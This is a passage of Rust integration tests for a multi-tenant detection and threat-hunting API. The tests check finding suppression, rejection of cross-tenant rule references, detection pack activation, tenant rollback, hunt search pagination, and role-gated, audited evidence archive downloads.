                mitre_attack: None,
                enabled: Some(true),
                author: Some("integration-test".to_string()),
            },
        )
        .await
        .expect("create rule");
    let finding = detection_service
        .create_detection_finding_for_test(
            harness.tenant_id,
            rule.id,
            &rule.name,
            &rule.source_format,
            "medium",
            "Suppression test",
            "matched suppression flow",
            &["artifact://evt-1", "artifact://evt-2"],
        )
        .await
        .expect("create finding");

    let suppress_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/detections/findings/{}/suppress", finding.id),
        Some(&harness.api_key),
        Some(serde_json::json!({ "reason": "known benign fixture" })),
    )
    .await;
    assert_eq!(suppress_resp.0, StatusCode::OK);
    assert_eq!(suppress_resp.1["status"], "suppressed");
    assert!(
        suppress_resp.1["evidence_refs"]
            .as_array()
            .expect("evidence array")
            .len()
            >= 2
    );
    assert!(suppress_resp.1["ocsf"]["finding_info"].is_object());

    let suppression_list = request_json(
        &harness.app,
        Method::GET,
        "/api/v1/detections/suppressions".to_string(),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(suppression_list.0, StatusCode::OK);
    assert_eq!(
        suppression_list
            .1
            .as_array()
            .expect("suppressions array")
            .len(),
        1
    );
    assert_eq!(suppression_list.1[0]["reason"], "known benign fixture");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn detections_cross_tenant_suppression_reference_does_not_persist() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let detection_service = AlerterService::new(harness.db.clone());
    let local_rule = detection_service
        .create_detection_rule(
            harness.tenant_id,
            "integration-test",
            crate::services::alerter::CreateDetectionRule {
                name: "local-suppression-target".to_string(),
                description: Some("local rule".to_string()),
                severity: "medium".to_string(),
                source_format: "native_correlation".to_string(),
                execution_mode: "streaming".to_string(),
                source_text: Some("schema: clawdstrike.hunt.correlation.v1\nname: local-suppression-target\nseverity: medium\ndescription: test\nwindow: 30s\nconditions:\n  - source: receipt\n    bind: evt\noutput:\n  title: Local suppression target\n  evidence:\n    - evt\n".to_string()),
                source_object: None,
                tags: Some(vec!["test".to_string()]),
                mitre_attack: None,
                enabled: Some(true),
                author: Some("integration-test".to_string()),
            },
        )
        .await
        .expect("create local rule");

    let foreign_tenant_id = seed_tenant(&harness.db, "other-int", "Other Integration").await;
    let foreign_rule = detection_service
        .create_detection_rule(
            foreign_tenant_id,
            "integration-test",
            crate::services::alerter::CreateDetectionRule {
                name: "foreign-suppression-target".to_string(),
                description: Some("foreign rule".to_string()),
                severity: "medium".to_string(),
                source_format: "native_correlation".to_string(),
                execution_mode: "streaming".to_string(),
                source_text: Some("schema: clawdstrike.hunt.correlation.v1\nname: foreign-suppression-target\nseverity: medium\ndescription: test\nwindow: 30s\nconditions:\n  - source: receipt\n    bind: evt\noutput:\n  title: Foreign suppression target\n  evidence:\n    - evt\n".to_string()),
                source_object: None,
                tags: Some(vec!["test".to_string()]),
                mitre_attack: None,
                enabled: Some(true),
                author: Some("integration-test".to_string()),
            },
        )
        .await
        .expect("create foreign rule");
    let foreign_finding = detection_service
        .create_detection_finding_for_test(
            foreign_tenant_id,
            foreign_rule.id,
            &foreign_rule.name,
            &foreign_rule.source_format,
            "medium",
            "Foreign suppression target",
            "foreign finding",
            &["artifact://foreign-evt-1"],
        )
        .await
        .expect("create foreign finding");

    let suppress_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/detections/suppressions".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "rule_id": local_rule.id,
            "finding_id": foreign_finding.id,
            "reason": "cross-tenant reference"
        })),
    )
    .await;
    assert_eq!(suppress_resp.0, StatusCode::NOT_FOUND);

    let suppression_count: i64 = sqlx::query_scalar::query_scalar(
        "SELECT COUNT(*) FROM detection_suppressions WHERE tenant_id = $1",
    )
    .bind(harness.tenant_id)
    .fetch_one(&harness.db)
    .await
    .expect("count suppressions");
    assert_eq!(suppression_count, 0);

    let foreign_finding_after = detection_service
        .get_detection_finding(foreign_tenant_id, foreign_finding.id)
        .await
        .expect("load foreign finding");
    assert_eq!(foreign_finding_after.status, "open");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn detections_findings_require_tenant_local_rule_reference() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let detection_service = AlerterService::new(harness.db.clone());
    let foreign_tenant_id = seed_tenant(
        &harness.db,
        "finding-other-int",
        "Finding Other Integration",
    )
    .await;
    let foreign_rule = detection_service
        .create_detection_rule(
            foreign_tenant_id,
            "integration-test",
            crate::services::alerter::CreateDetectionRule {
                name: "foreign-finding-target".to_string(),
                description: Some("foreign rule".to_string()),
                severity: "medium".to_string(),
                source_format: "native_correlation".to_string(),
                execution_mode: "streaming".to_string(),
                source_text: Some("schema: clawdstrike.hunt.correlation.v1\nname: foreign-finding-target\nseverity: medium\ndescription: test\nwindow: 30s\nconditions:\n  - source: receipt\n    bind: evt\noutput:\n  title: Foreign finding target\n  evidence:\n    - evt\n".to_string()),
                source_object: None,
                tags: Some(vec!["test".to_string()]),
                mitre_attack: None,
                enabled: Some(true),
                author: Some("integration-test".to_string()),
            },
        )
        .await
        .expect("create foreign rule");

    let err = detection_service
        .create_detection_finding_for_test(
            harness.tenant_id,
            foreign_rule.id,
            &foreign_rule.name,
            &foreign_rule.source_format,
            "medium",
            "Cross tenant finding target",
            "should fail",
            &["artifact://foreign-evt-1"],
        )
        .await
        .expect_err("cross-tenant rule reference should fail");
    assert!(matches!(err, crate::error::ApiError::NotFound));

    let finding_count: i64 = sqlx::query_scalar::query_scalar(
        "SELECT COUNT(*) FROM detection_findings WHERE tenant_id = $1",
    )
    .bind(harness.tenant_id)
    .fetch_one(&harness.db)
    .await
    .expect("count findings");
    assert_eq!(finding_count, 0);

    let evidence_count: i64 = sqlx::query_scalar::query_scalar(
        "SELECT COUNT(*) FROM detection_finding_evidence WHERE tenant_id = $1",
    )
    .bind(harness.tenant_id)
    .fetch_one(&harness.db)
    .await
    .expect("count evidence");
    assert_eq!(evidence_count, 0);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn detections_mismatched_rule_and_finding_reference_do_not_persist() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let detection_service = AlerterService::new(harness.db.clone());
    let primary_rule = detection_service
        .create_detection_rule(
            harness.tenant_id,
            "integration-test",
            crate::services::alerter::CreateDetectionRule {
                name: "primary-suppression-target".to_string(),
                description: Some("primary rule".to_string()),
                severity: "medium".to_string(),
                source_format: "native_correlation".to_string(),
                execution_mode: "streaming".to_string(),
                source_text: Some("schema: clawdstrike.hunt.correlation.v1\nname: primary-suppression-target\nseverity: medium\ndescription: test\nwindow: 30s\nconditions:\n  - source: receipt\n    bind: evt\noutput:\n  title: Primary suppression target\n  evidence:\n    - evt\n".to_string()),
                source_object: None,
                tags: Some(vec!["test".to_string()]),
                mitre_attack: None,
                enabled: Some(true),
                author: Some("integration-test".to_string()),
            },
        )
        .await
        .expect("create primary rule");
    let secondary_rule = detection_service
        .create_detection_rule(
            harness.tenant_id,
            "integration-test",
            crate::services::alerter::CreateDetectionRule {
                name: "secondary-suppression-target".to_string(),
                description: Some("secondary rule".to_string()),
                severity: "medium".to_string(),
                source_format: "native_correlation".to_string(),
                execution_mode: "streaming".to_string(),
                source_text: Some("schema: clawdstrike.hunt.correlation.v1\nname: secondary-suppression-target\nseverity: medium\ndescription: test\nwindow: 30s\nconditions:\n  - source: receipt\n    bind: evt\noutput:\n  title: Secondary suppression target\n  evidence:\n    - evt\n".to_string()),
                source_object: None,
                tags: Some(vec!["test".to_string()]),
                mitre_attack: None,
                enabled: Some(true),
                author: Some("integration-test".to_string()),
            },
        )
        .await
        .expect("create secondary rule");
    let finding = detection_service
        .create_detection_finding_for_test(
            harness.tenant_id,
            primary_rule.id,
            &primary_rule.name,
            &primary_rule.source_format,
            "medium",
            "Primary suppression target",
            "local finding",
            &["artifact://local-evt-1"],
        )
        .await
        .expect("create local finding");

    let suppress_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/detections/suppressions".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "rule_id": secondary_rule.id,
            "finding_id": finding.id,
            "reason": "mismatched references"
        })),
    )
    .await;
    assert_eq!(suppress_resp.0, StatusCode::BAD_REQUEST);
    assert_eq!(
        suppress_resp.1["error"],
        "finding_id does not belong to the provided rule_id"
    );

    let suppression_count: i64 = sqlx::query_scalar::query_scalar(
        "SELECT COUNT(*) FROM detection_suppressions WHERE tenant_id = $1",
    )
    .bind(harness.tenant_id)
    .fetch_one(&harness.db)
    .await
    .expect("count suppressions");
    assert_eq!(suppression_count, 0);

    let finding_after = detection_service
        .get_detection_finding(harness.tenant_id, finding.id)
        .await
        .expect("load finding");
    assert_eq!(finding_after.status, "open");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn detection_packs_remain_policy_pack_metadata_extensions() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let create_rule = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/detections/rules".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Pack rule",
            "description": "Pack activation coverage",
            "severity": "high",
            "source_format": "sigma",
            "execution_mode": "streaming",
            "source_text": "title: Pack Rule\nlevel: high\nlogsource:\n  category: process_creation\ndetection:\n  selection:\n    CommandLine: suspicious\n  condition: selection\n",
            "enabled": true
        })),
    )
    .await;
    assert_eq!(create_rule.0, StatusCode::OK);
    let rule_id = create_rule.1["id"].as_str().expect("rule id").to_string();

    let install_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/detections/packs/install".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "package_name": "fleet-pack",
            "version": "1.0.0",
            "trust_level": "verified",
            "metadata": {
                "pkg_type": "policy-pack",
                "clawdstrike": {
                    "detection_pack": {
                        "format_version": "1",
                        "contains": ["sigma", "native_correlation"],
                        "default_enable": false
                    }
                }
            }
        })),
    )
    .await;
    assert_eq!(install_resp.0, StatusCode::OK);
    assert_eq!(install_resp.1["package_type"], "policy-pack");

    let activate_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/detections/packs/fleet-pack/1.0.0/activate".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "activated_rules": [rule_id]
        })),
    )
    .await;
    assert_eq!(activate_resp.0, StatusCode::OK);
    assert_eq!(
        activate_resp.1["activated_rules"]
            .as_array()
            .expect("activated rules")
            .len(),
        1
    );

    let pack_rules = request_json(
        &harness.app,
        Method::GET,
        "/api/v1/detections/packs/fleet-pack/1.0.0/rules".to_string(),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(pack_rules.0, StatusCode::OK);
    assert_eq!(pack_rules.1.as_array().expect("pack rules").len(), 1);
    assert_eq!(pack_rules.1[0]["name"], "Pack rule");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn detection_pack_activation_rejects_cross_tenant_rule_ids() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let detection_service = AlerterService::new(harness.db.clone());
    let foreign_tenant_id =
        seed_tenant(&harness.db, "pack-other-int", "Pack Other Integration").await;
    let foreign_rule = detection_service
        .create_detection_rule(
            foreign_tenant_id,
            "integration-test",
            crate::services::alerter::CreateDetectionRule {
                name: "foreign-pack-rule".to_string(),
                description: Some("foreign pack rule".to_string()),
                severity: "medium".to_string(),
                source_format: "native_correlation".to_string(),
                execution_mode: "streaming".to_string(),
                source_text: Some("schema: clawdstrike.hunt.correlation.v1\nname: foreign-pack-rule\nseverity: medium\ndescription: test\nwindow: 30s\nconditions:\n  - source: receipt\n    bind: evt\noutput:\n  title: Foreign pack rule\n  evidence:\n    - evt\n".to_string()),
                source_object: None,
                tags: Some(vec!["test".to_string()]),
                mitre_attack: None,
                enabled: Some(true),
                author: Some("integration-test".to_string()),
            },
        )
        .await
        .expect("create foreign rule");

    let install_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/detections/packs/install".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "package_name": "fleet-pack-invalid",
            "version": "1.0.0",
            "trust_level": "verified",
            "metadata": {
                "pkg_type": "policy-pack",
                "clawdstrike": {
                    "detection_pack": {
                        "format_version": "1",
                        "contains": ["native_correlation"],
                        "default_enable": false
                    }
                }
            }
        })),
    )
    .await;
    assert_eq!(install_resp.0, StatusCode::OK);

    let activate_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/detections/packs/fleet-pack-invalid/1.0.0/activate".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "activated_rules": [foreign_rule.id]
        })),
    )
    .await;
    assert_eq!(activate_resp.0, StatusCode::BAD_REQUEST);
    assert!(activate_resp.1["error"]
        .as_str()
        .expect("activation error")
        .contains("activated_rules contains unknown or cross-tenant rule id"));

    let pack_resp = request_json(
        &harness.app,
        Method::GET,
        "/api/v1/detections/packs/fleet-pack-invalid/1.0.0".to_string(),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(pack_resp.0, StatusCode::OK);
    assert_eq!(
        pack_resp.1["activated_rules"]
            .as_array()
            .expect("activated rules")
            .len(),
        0
    );
}
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn create_tenant_rolls_back_when_nats_provisioning_fails() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let signing_keypair = Arc::new(hush_core::Keypair::generate());
    let failing_provisioner = TenantProvisioner::new(
        harness.db.clone(),
        harness.nats_url.clone(),
        "external",
        Some("http://127.0.0.1:9".to_string()),
        None,
        false,
    )
    .expect("failing provisioner should construct");
    let failing_state = AppState {
        config: Config {
            listen_addr: "127.0.0.1:0".parse().expect("listen addr"),
            cors_allowed_origins: Vec::new(),
            database_url: "postgres://unused".to_string(),
            nats_url: harness.nats_url.clone(),
            agent_nats_url: harness.nats_url.clone(),
            nats_provisioning_mode: "external".to_string(),
            nats_provisioner_base_url: Some("http://127.0.0.1:9".to_string()),
            nats_provisioner_api_token: None,
            nats_allow_insecure_mock_provisioner: false,
            jwt_secret: "jwt-secret".to_string(),
            jwt_issuer: "clawdstrike-control-api".to_string(),
            jwt_audience: "clawdstrike-control-api".to_string(),
            stripe_secret_key: "stripe-key".to_string(),
            stripe_webhook_secret: "stripe-webhook".to_string(),
            approval_signing_enabled: true,
            approval_signing_keypair_path: None,
            approval_resolution_outbox_enabled: true,
            approval_resolution_outbox_poll_interval_secs: 5,
            audit_consumer_enabled: false,
            audit_subject_filter: "tenant-*.>".to_string(),
            audit_stream_name: "audit".to_string(),
            audit_consumer_name: "audit-consumer".to_string(),
            approval_consumer_enabled: false,
            approval_subject_filter: "tenant-*.>".to_string(),
            approval_stream_name: "approval".to_string(),
            approval_consumer_name: "approval-consumer".to_string(),
            heartbeat_consumer_enabled: false,
            heartbeat_subject_filter: "tenant-*.>".to_string(),
            heartbeat_stream_name: "heartbeat".to_string(),
            heartbeat_consumer_name: "heartbeat-consumer".to_string(),
            hunt_event_consumer_enabled: false,
            hunt_event_subject_filter: "tenant-*.>".to_string(),
            hunt_event_stream_name: "hunt-events".to_string(),
            hunt_event_consumer_name: "hunt-event-consumer".to_string(),
            stale_detector_enabled: false,
            stale_check_interval_secs: 60,
            stale_threshold_secs: 120,
            dead_threshold_secs: 300,
        },
        db: harness.db.clone(),
        nats: harness.nats.clone(),
        provisioner: failing_provisioner,
        metering: MeteringService::new(harness.db.clone()),
        alerter: AlerterService::new(harness.db.clone()),
        retention: RetentionService::new(harness.db.clone()),
        signing_keypair: Some(signing_keypair),
        receipt_store: crate::routes::receipts::ReceiptStore::new(),
        catalog: crate::services::catalog::CatalogStore::new(),
    };
    let app = routes::router(failing_state);

    let create_resp = request_json(
        &app,
        Method::POST,
        "/api/v1/tenants".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Provision Fail",
            "slug": "provision-fail",
            "plan": "enterprise"
        })),
    )
    .await;
    assert_eq!(create_resp.0, StatusCode::INTERNAL_SERVER_ERROR);
    assert_eq!(create_resp.1["error"], "messaging error");

    let row = sqlx::query::query("SELECT id FROM tenants WHERE slug = 'provision-fail'")
        .fetch_optional(&harness.db)
        .await
        .expect("tenant lookup should succeed");
    assert!(
        row.is_none(),
        "tenant row must be rolled back on provisioning failure"
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn hunt_search_timeline_and_saved_hunts_round_trip() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    seed_hunt_events(&harness).await;

    let search_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hunt/search".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "principalId": "principal-1",
            "limit": 1
        })),
    )
    .await;
    assert_eq!(search_resp.0, StatusCode::OK);
    assert_eq!(search_resp.1["total"], 2);
    assert_eq!(search_resp.1["events"][0]["eventId"], "hunt-evt-2");
    assert!(search_resp.1["nextCursor"].is_string());

    let cursor = search_resp.1["nextCursor"]
        .as_str()
        .expect("next cursor should be present")
        .to_string();
    let next_page_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hunt/search".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "principalId": "principal-1",
            "limit": 1,
            "cursor": cursor
        })),
    )
    .await;
    assert_eq!(next_page_resp.0, StatusCode::OK);
    assert_eq!(next_page_resp.1["events"][0]["eventId"], "hunt-evt-1");

    let literal_wildcard_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hunt/search".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "process": "%",
            "limit": 10
        })),
    )
    .await;
    assert_eq!(literal_wildcard_resp.0, StatusCode::OK);
    assert_eq!(
        literal_wildcard_resp.1["events"]
            .as_array()
            .expect("literal wildcard events")
            .len(),
        0
    );

    let timeline_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hunt/timeline".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "sessionId": "session-1",
            "limit": 10
        })),
    )
    .await;
    assert_eq!(timeline_resp.0, StatusCode::OK);
    assert_eq!(timeline_resp.1["groupedBy"], "session");
    assert_eq!(timeline_resp.1["events"][0]["eventId"], "hunt-evt-1");
    assert_eq!(timeline_resp.1["events"][1]["eventId"], "hunt-evt-2");

    let create_saved_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hunt/saved".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "curl session hunt",
            "description": "integration saved hunt",
            "query": {
                "sessionId": "session-1",
                "limit": 10
            }
        })),
    )
    .await;
    assert_eq!(create_saved_resp.0, StatusCode::OK);
    let saved_id = create_saved_resp.1["id"].as_str().expect("saved hunt id");

    let list_saved_resp = request_json(
        &harness.app,
        Method::GET,
        "/api/v1/hunt/saved".to_string(),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(list_saved_resp.0, StatusCode::OK);
    assert_eq!(list_saved_resp.1.as_array().expect("saved hunts").len(), 1);

    let run_saved_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/hunt/saved/{saved_id}/run"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(run_saved_resp.0, StatusCode::OK);
    assert_eq!(run_saved_resp.1["jobType"], "saved_hunt");
    assert_eq!(run_saved_resp.1["status"], "completed");
    assert_eq!(
        run_saved_resp.1["result"]["events"]
            .as_array()
            .expect("saved run events")
            .len(),
        2
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn hunt_endpoint_archive_upload_and_download_round_trip() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let archive = serde_json::json!({
        "schemaVersion": 1,
        "bundle": {
            "bundleId": "evidence_bundle-fleet-1",
            "graphSliceId": "graph_slice-fleet-1",
            "contentHash": "0xcontentfleet"
        },
        "artifact": {
            "byteCount": 64
        },
        "graph": {
            "nodes": {
                "process:1": {
                    "nodeId": "process:1",
                    "kind": "process",
                    "label": "python"
                }
            },
            "edges": []
        },
        "receipts": []
    });
    let archive_hash = canonical_json_hash_for_test(&archive);
    let archive_id = "evidence_bundle_archive-fleet-1";
    let raw_ref = format!("endpoint-evidence-bundle-archive:{archive_id}:{archive_hash}");

    let upload_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hunt/evidence-bundle-archives".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "archiveId": archive_id,
            "archiveHash": archive_hash,
            "rawRef": raw_ref,
            "bundleId": "evidence_bundle-fleet-1",
            "endpointAgentId": "endpoint-agent-archive-1",
            "eventId": "evidence-bundle-archive:endpoint-agent-archive-1:evidence_bundle_archive-fleet-1",
            "rawArtifactApprovalId": "approval-archive-fleet-1",
            "rawArtifactApprovalReasonHash": "0x1111111111111111",
            "archive": archive,
            "verification": {
                "verified": true,
                "archiveHashMatches": true
            },
            "retentionDays": 90,
            "metadata": {
                "source": "agent"
            }
        })),
    )
    .await;
    assert_eq!(upload_resp.0, StatusCode::OK);
    assert_eq!(upload_resp.1["archiveId"], archive_id);
    assert_eq!(upload_resp.1["archiveHash"], archive_hash);
    assert_eq!(upload_resp.1["rawRef"], raw_ref);
    assert_eq!(upload_resp.1["bundleId"], "evidence_bundle-fleet-1");
    assert_eq!(
        upload_resp.1["rawArtifactApprovalId"],
        "approval-archive-fleet-1"
    );
    assert_eq!(upload_resp.1["retentionDays"], 30);
    assert!(upload_resp.1.get("archive").is_none());
    let upload_audit_row = sqlx::query::query(
        r#"SELECT event_type, quantity, metadata
           FROM usage_events
           WHERE tenant_id = $1
             AND event_type = 'endpoint_evidence_archive.raw_uploaded'"#,
    )
    .bind(harness.tenant_id)
    .fetch_one(&harness.db)
    .await
    .expect("raw archive upload should be audited");
    let upload_audit_event_type: String = upload_audit_row
        .try_get("event_type")
        .expect("upload audit event_type");
    let upload_audit_quantity: i32 = upload_audit_row
        .try_get("quantity")
        .expect("upload audit quantity");
    let upload_audit_metadata: Value = upload_audit_row
        .try_get("metadata")
        .expect("upload audit metadata");
    assert_eq!(
        upload_audit_event_type,
        "endpoint_evidence_archive.raw_uploaded"
    );
    assert_eq!(upload_audit_quantity, 1);
    assert_eq!(upload_audit_metadata["archiveId"], archive_id);
    assert_eq!(upload_audit_metadata["archiveHash"], archive_hash);
    assert_eq!(upload_audit_metadata["rawRef"], raw_ref);
    assert_eq!(upload_audit_metadata["bundleId"], "evidence_bundle-fleet-1");
    assert_eq!(
        upload_audit_metadata["rawArtifactApprovalId"],
        "approval-archive-fleet-1"
    );
    assert_eq!(
        upload_audit_metadata["rawArtifactApprovalReasonHash"],
        "0x1111111111111111"
    );
    assert_eq!(upload_audit_metadata["actorType"], "service");
    assert_eq!(upload_audit_metadata["actorRole"], "admin");
    assert!(upload_audit_metadata.get("archive").is_none());

    let get_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/hunt/evidence-bundle-archives/{archive_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(get_resp.0, StatusCode::OK);
    assert_eq!(get_resp.1["archiveId"], archive_id);
    assert!(get_resp.1.get("archive").is_none());

    let download_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/hunt/evidence-bundle-archives/{archive_id}/download"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(download_resp.0, StatusCode::OK);
    assert_eq!(download_resp.1["record"]["archiveId"], archive_id);
    assert_eq!(
        download_resp.1["archive"]["bundle"]["bundleId"],
        "evidence_bundle-fleet-1"
    );
    assert_eq!(
        canonical_json_hash_for_test(&download_resp.1["archive"]),
        archive_hash
    );
    let audit_row = sqlx::query::query(
        r#"SELECT event_type, quantity, metadata
           FROM usage_events
           WHERE tenant_id = $1
             AND event_type = 'endpoint_evidence_archive.raw_downloaded'"#,
    )
    .bind(harness.tenant_id)
    .fetch_one(&harness.db)
    .await
    .expect("raw archive download should be audited");
    let audit_event_type: String = audit_row.try_get("event_type").expect("audit event_type");
    let audit_quantity: i32 = audit_row.try_get("quantity").expect("audit quantity");
    let audit_metadata: Value = audit_row.try_get("metadata").expect("audit metadata");
    assert_eq!(audit_event_type, "endpoint_evidence_archive.raw_downloaded");
    assert_eq!(audit_quantity, 1);
    assert_eq!(audit_metadata["archiveId"], archive_id);
    assert_eq!(audit_metadata["archiveHash"], archive_hash);
    assert_eq!(audit_metadata["rawRef"], raw_ref);
    assert_eq!(audit_metadata["bundleId"], "evidence_bundle-fleet-1");
    assert_eq!(audit_metadata["actorType"], "service");
    assert_eq!(audit_metadata["actorRole"], "admin");
    assert!(audit_metadata.get("archive").is_none());

    let viewer_api_key = "cs_it_archive_viewer_key";
    insert_api_key_for_tenant(
        &harness.db,
        harness.tenant_id,
        viewer_api_key,
        "archive-viewer",
        &["viewer"],
    )
    .await;

    let viewer_metadata_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/hunt/evidence-bundle-archives/{archive_id}"),
        Some(viewer_api_key),
        None,
    )
    .await;
    assert_eq!(viewer_metadata_resp.0, StatusCode::OK);
    assert!(viewer_metadata_resp.1.get("archive").is_none());

    let viewer_download_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/hunt/evidence-bundle-archives/{archive_id}/download"),
        Some(viewer_api_key),
        None,
    )
    .await;
    assert_eq!(viewer_download_resp.0, StatusCode::FORBIDDEN);

    let member_api_key = "cs_it_archive_member_key";
    insert_api_key_for_tenant(
        &harness.db,
        harness.tenant_id,
        member_api_key,
        "archive-member",
        &["write"],
    )
    .await;

    let member_upload_archive = serde_json::json!({
        "schemaVersion": 1,
        "bundle": {
            "bundleId": "evidence_bundle-member-upload",
            "graphSliceId": "graph_slice-member-upload",
            "contentHash": "0xcontentmemberupload"
        },
        "artifact": {
            "byteCount": 32
        },
        "graph": {
            "nodes": {
                "process:member": {
                    "nodeId": "process:member",
                    "kind": "process",
                    "label": "node"
                }
            },
            "edges": []
        },
        "receipts": []
    });
    let member_upload_archive_hash = canonical_json_hash_for_test(&member_upload_archive);
    let member_upload_archive_id = "evidence_bundle_archive-member-upload";
    let member_upload_raw_ref = format!(
        "endpoint-evidence-bundle-archive:{member_upload_archive_id}:{member_upload_archive_hash}"
    );
    let member_upload_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hunt/evidence-bundle-archives".to_string(),
        Some(member_api_key),
        Some(serde_json::json!({
            "archiveId": member_upload_archive_id,
            "archiveHash": member_upload_archive_hash,
            "rawRef": member_upload_raw_ref,
            "bundleId": "evidence_bundle-member-upload",
            "endpointAgentId": "endpoint-agent-member-upload",
            "eventId": "evidence-bundle-archive:endpoint-agent-member-upload:evidence_bundle_archive-member-upload",
            "rawArtifactApprovalId": "approval-archive-member-upload",
            "rawArtifactApprovalReasonHash": "0x2222222222222222",
            "archive": member_upload_archive,
            "verification": {
                "verified": true,
                "archiveHashMatches": true
            },
            "retentionDays": 30,
            "metadata": {
                "source": "agent"
            }
        })),
    )
    .await;
    assert_eq!(member_upload_resp.0, StatusCode::FORBIDDEN);
    let denied_upload_audit_row = sqlx::query::query(
        r#"SELECT event_type, quantity, metadata
           FROM usage_events
           WHERE tenant_id = $1
             AND event_type = 'endpoint_evidence_archive.raw_upload_denied'"#,
    )
    .bind(harness.tenant_id)
    .fetch_one(&harness.db)
    .await
    .expect("denied raw archive upload should be audited");
    let denied_upload_event_type: String = denied_upload_audit_row
        .try_get("event_type")
        .expect("denied upload audit event_type");
    let denied_upload_quantity: i32 = denied_upload_audit_row
        .try_get("quantity")
        .expect("denied upload audit quantity");
    let denied_upload_metadata: Value = denied_upload_audit_row
        .try_get("metadata")
        .expect("denied upload audit metadata");
    assert_eq!(
        denied_upload_event_type,
        "endpoint_evidence_archive.raw_upload_denied"
    );
    assert_eq!(denied_upload_quantity, 1);
    assert_eq!(
        denied_upload_metadata["archiveId"],
        member_upload_archive_id
    );
    assert_eq!(
        denied_upload_metadata["archiveHash"],
        member_upload_archive_hash
    );
    assert_eq!(denied_upload_metadata["rawRef"], member_upload_raw_ref);
    assert_eq!(
        denied_upload_metadata["rawArtifactApprovalId"],
        "approval-archive-member-upload"
    );
    assert_eq!(
        denied_upload_metadata["bundleId"],
        "evidence_bundle-member-upload"
    );
    assert_eq!(denied_upload_metadata["actorType"], "service");
    assert_eq!(denied_upload_metadata["actorRole"], "member");
    assert_eq!(
        denied_upload_metadata["deniedReason"],
        "admin_api_key_required"
    );
    assert!(denied_upload_metadata.get("archive").is_none());

    let member_metadata_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/hunt/evidence-bundle-archives/{archive_id}"),
        Some(member_api_key),
        None,
    )
    .await;
    assert_eq!(member_metadata_resp.0, StatusCode::OK);
    assert!(member_metadata_resp.1.get("archive").is_none());

    let member_download_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/hunt/evidence-bundle-archives/{archive_id}/download"),
        Some(member_api_key),
        None,
    )
    .await;
    assert_eq!(member_download_resp.0, StatusCode::FORBIDDEN);
    let denied_download_audit_row = sqlx::query::query(
        r#"SELECT event_type, quantity, metadata
           FROM usage_events
           WHERE tenant_id = $1
             AND event_type = 'endpoint_evidence_archive.raw_download_denied'
             AND metadata->>'actorRole' = 'member'"#,
    )
    .bind(harness.tenant_id)
    .fetch_one(&harness.db)
    .await
    .expect("denied raw archive download should be audited");
    let denied_download_event_type: String = denied_download_audit_row
